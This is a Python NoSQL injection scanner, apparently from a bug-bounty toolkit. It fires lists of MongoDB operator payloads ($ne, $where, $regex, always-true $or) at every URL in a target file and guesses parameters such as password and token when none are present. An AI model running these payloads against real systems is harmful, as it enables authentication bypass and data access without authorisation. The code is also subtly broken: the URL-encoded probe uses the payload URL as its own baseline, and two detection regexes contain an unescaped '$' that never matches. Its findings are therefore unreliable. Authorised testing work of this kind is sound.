#!/usr/bin/env python3
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

NOSQL_OPERATORS = [
    {"name": "ne_string", "value": '{"$ne":"invalid"}'},
    {"name": "ne_null", "value": '{"$ne":null}'},
    {"name": "gt_negative", "value": '{"$gt":""}'},
    {"name": "gt_large_number", "value": '{"$gt":999999999}'},
    {"name": "lt_zero", "value": '{"$lt":0}'},
    {"name": "regex_any", "value": '{"$regex":".*"}'},
    {"name": "regex_start_wild", "value": '{"$regex":"^.*"}'},
    {"name": "regex_contains_a", "value": '{"$regex":"a"}'},
    {"name": "in_list", "value": '{"$in":["admin","root","user"]}'},
    {"name": "nin_list", "value": '{"$nin":[]}'},
    {"name": "where_js_true", "value": '{"$where":"1"}'},
    {"name": "where_always_true", "value": '{"$where":"this.username==this.username"}'},
    {"name": "exists_true", "value": '{"$exists":true}'},
    {"name": "or_always_true", "value": '{"$or":[{"username":"admin"},{"$where":"1"}]}'},
    {"name": "and_trick", "value": '{"$and":[{"$where":"1"},{"$where":"1"}]}'},
    {"name": "mod_zero", "value": '{"$mod":[2,0]}'},
    {"name": "size_gte", "value": '{"$size":1000000}'},
    {"name": "type_number", "value": '{"$type":1}'},
    {"name": "type_string", "value": '{"$type":2}'},
]

URL_ENCODED_NOSQL = [
    {"name": "ne_urlencoded", "value": "{%22$ne%22:%22invalid%22}"},
    {"name": "gt_urlencoded", "value": "{%22$gt%22:%22%22}"},
    {"name": "regex_urlencoded", "value": "{%22$regex%22:%22.*%22}"},
    {"name": "where_urlencoded", "value": "{%22$where%22:%221%22}"},
    {"name": "or_urlencoded", "value": "{%22$or%22:[{%22username%22:%22admin%22},{%22$where%22:%221%22}]}"},
]

CONTENT_TYPE_VARIANTS = [
    {"name": "json_default", "content_type": "application/json", "encode": lambda v: json.dumps(v)},
    {"name": "form_urlencoded", "content_type": "application/x-www-form-urlencoded", "encode": lambda v: urllib.parse.urlencode({"$where": "1"})},
    {"name": "form_multipart", "content_type": "multipart/form-data", "encode": None},
]

DETECTION_SIGNALS = [
    re.compile(r"MongoError", re.IGNORECASE),
    re.compile(r"MongoDB", re.IGNORECASE),
    re.compile(r"Can't canonicalize query", re.IGNORECASE),
    re.compile(r"CastError", re.IGNORECASE),
    re.compile(r"BSONTypeError", re.IGNORECASE),
    re.compile(r"$where is not allowed", re.IGNORECASE),
    re.compile(r"invalid operator", re.IGNORECASE),
    re.compile(r"$regex has to be a string", re.IGNORECASE),
    re.compile(r"unknown operator", re.IGNORECASE),
    re.compile(r"cannot use the part", re.IGNORECASE),
    re.compile(r"Expression .* only supports field", re.IGNORECASE),
]


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_urls(urls_file):
    urls = []
    if not urls_file or not os.path.exists(urls_file):
        return urls
    with open(urls_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def extract_params_from_url(url):
    params = set()
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    for k in query_params:
        params.add(k)
    param_pattern = re.findall(r'[?&]([\w\[\]]+)=', url)
    for p in param_pattern:
        params.add(p)
    return list(params)


def detect_nosql_error(response_text):
    if not response_text:
        return False, None
    for sig in DETECTION_SIGNALS:
        m = sig.search(response_text)
        if m:
            start = max(0, m.start() - 30)
            end = min(len(response_text), m.end() + 50)
            return True, response_text[start:end]
    return False, None


def compute_confidence(response_before_len, response_after_len, status_before, status_after, has_error_signal):
    confidence = 0.0
    if has_error_signal:
        confidence += 0.5
    if status_before != status_after:
        confidence += 0.2
    if response_before_len > 0 and response_after_len > 0:
        ratio = abs(response_after_len - response_before_len) / max(response_before_len, 1)
        if ratio > 0.5:
            confidence += 0.3
        elif ratio > 0.2:
            confidence += 0.15
    return round(min(1.0, confidence), 2)


def probe_nosql_json(url, param, operator, session, timeout, rate_limit, dry_run):
    result = {
        "url": url,
        "param": param,
        "payload_name": operator["name"],
        "payload_value": operator["value"],
        "injection_type": "json_operator",
        "technique": "nosql_injection",
        "nosql_detected": False,
        "error_signal": False,
        "error_snippet": None,
        "status_before": 0,
        "response_before_len": 0,
        "status_after": 0,
        "response_after_len": 0,
        "confidence": 0.0,
        "dry_run": dry_run,
    }
    if dry_run:
        print(f"[dry-run] NoSQL JSON: URL={url} param={param} op={operator['name']}", file=sys.stderr)
        return result
    try:
        try:
            op_val = json.loads(operator["value"])
        except json.JSONDecodeError:
            op_val = operator["value"]
        payload_body = {param: op_val}
        json_body = json.dumps(payload_body)
        baseline_resp = session.get(url, timeout=timeout, allow_redirects=True)
        result["status_before"] = baseline_resp.status_code
        result["response_before_len"] = len(baseline_resp.text)
        test_resp = session.post(
            url,
            data=json_body,
            headers={"Content-Type": "application/json"},
            timeout=timeout,
            allow_redirects=True,
        )
        result["status_after"] = test_resp.status_code
        result["response_after_len"] = len(test_resp.text)
        has_err, err_snippet = detect_nosql_error(test_resp.text)
        result["error_signal"] = has_err
        result["error_snippet"] = err_snippet
        if has_err or (
            result["status_after"] != result["status_before"]
            and result["status_before"] > 0
            and result["status_after"] != 200
        ):
            result["nosql_detected"] = True
        result["confidence"] = compute_confidence(
            result["response_before_len"], result["response_after_len"],
            result["status_before"], result["status_after"],
            has_err
        )
        if result["nosql_detected"] or has_err:
            print(f"[nosql] {url} param={param} op={operator['name']} conf={result['confidence']}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)
    except requests.exceptions.RequestException as e:
        result["error_signal"] = True
        result["error_snippet"] = str(e)
    return result


def probe_nosql_urlencoded(url, param, operator, session, timeout, rate_limit, dry_run):
    result = {
        "url": url,
        "param": param,
        "payload_name": operator["name"],
        "payload_value": operator["value"],
        "injection_type": "url_encoded_operator",
        "technique": "nosql_injection",
        "nosql_detected": False,
        "error_signal": False,
        "error_snippet": None,
        "status_before": 0,
        "response_before_len": 0,
        "status_after": 0,
        "response_after_len": 0,
        "confidence": 0.0,
        "dry_run": dry_run,
    }
    if dry_run:
        test_url = f"{url}?{param}={operator['value']}"
        print(f"[dry-run] NoSQL URL-encoded: {test_url}", file=sys.stderr)
        return result
    try:
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        query_params[param] = [operator["value"]]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        parts = list(parsed)
        parts[4] = new_query
        baseline_url = urllib.parse.urlunparse(parts)
        test_url = baseline_url
        baseline_resp = session.get(baseline_url, timeout=timeout, allow_redirects=True)
        result["status_before"] = baseline_resp.status_code
        result["response_before_len"] = len(baseline_resp.text)
        test_resp = session.get(test_url, timeout=timeout, allow_redirects=True)
        result["status_after"] = test_resp.status_code
        result["response_after_len"] = len(test_resp.text)
        has_err, err_snippet = detect_nosql_error(test_resp.text)
        result["error_signal"] = has_err
        result["error_snippet"] = err_snippet
        if has_err or (
            result["status_after"] != result["status_before"]
            and result["status_before"] > 0
            and abs(result["response_after_len"] - result["response_before_len"]) > 50
        ):
            result["nosql_detected"] = True
        result["confidence"] = compute_confidence(
            result["response_before_len"], result["response_after_len"],
            result["status_before"], result["status_after"],
            has_err
        )
        if result["nosql_detected"] or has_err:
            print(f"[nosql_url] {url} param={param} op={operator['name']} conf={result['confidence']}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)
    except requests.exceptions.RequestException as e:
        result["error_signal"] = True
        result["error_snippet"] = str(e)
    return result


def main():
    parser = argparse.ArgumentParser(
        description="NoSQL Injector — detect MongoDB NoSQL injection vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --urls live_urls.txt --context .bb/context.json
  %(prog)s --urls single_url.txt --context .bb/context.json --dry-run
  %(prog)s --urls urls.txt --rate-limit 5 --timeout 10 --no-urlencoded
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--urls", required=True, help="File with target URLs, one per line")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--rate-limit", type=int, default=5, help="Max requests per second (default: 5)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--concurrency", type=int, default=3, help="Thread pool concurrency (default: 3)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned requests without executing")
    parser.add_argument("--no-urlencoded", action="store_true", help="Skip URL-encoded NoSQL operator tests")
    parser.add_argument("--user-agent", default="BugBountyAgent/2.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--proxy", default=None, help="HTTP proxy")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    os.makedirs(outdir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "nosql_findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        print("[error] No URLs loaded from --urls file.", file=sys.stderr)
        sys.exit(1)

    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session_base = requests.Session()
    session_base.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "application/json, text/html, */*",
    })
    if proxy_dict:
        session_base.proxies.update(proxy_dict)
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session_base.mount("https://", adapter)
    session_base.mount("http://", adapter)

    tasks = []
    for url in urls:
        params = extract_params_from_url(url)
        if not params:
            params = ["username", "password", "email", "id", "user", "name", "search", "q", "query", "token", "key", "api_key"]
        for param in params:
            for op in NOSQL_OPERATORS:
                tasks.append((url, param, op, "json"))
            if not args.no_urlencoded:
                for op in URL_ENCODED_NOSQL:
                    tasks.append((url, param, op, "urlencoded"))

    print(f"[info] Prepared {len(tasks)} NoSQL injection tasks across {len(urls)} URLs", file=sys.stderr)

    if args.dry_run:
        for url, param, op, method in tasks:
            if method == "json":
                probe_nosql_json(url, param, op, session_base, args.timeout, args.rate_limit, dry_run=True)
            else:
                probe_nosql_urlencoded(url, param, op, session_base, args.timeout, args.rate_limit, dry_run=True)
        print(f"[dry-run] Dry run complete — {len(tasks)} tasks would be executed.", file=sys.stderr)
        return

    all_findings = []
    completed = 0
    with open(output_path, "w") as outfile:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            futures = {}
            for url, param, op, method in tasks:
                if method == "json":
                    future = executor.submit(probe_nosql_json, url, param, op, requests.Session(), args.timeout, args.rate_limit, dry_run=False)
                else:
                    future = executor.submit(probe_nosql_urlencoded, url, param, op, requests.Session(), args.timeout, args.rate_limit, dry_run=False)
                futures[future] = (url, param, op)
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception as e:
                    continue
                outfile.write(json.dumps(result) + "\n")
                completed += 1
                if result.get("nosql_detected") or result.get("error_signal"):
                    all_findings.append(result)
                if completed % 100 == 0:
                    print(f"[progress] {completed}/{len(tasks)} probes", file=sys.stderr)

    summary = {
        "total_probes": len(tasks),
        "total_completed": completed,
        "total_findings": len(all_findings),
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)


if __name__ == "__main__":
    main()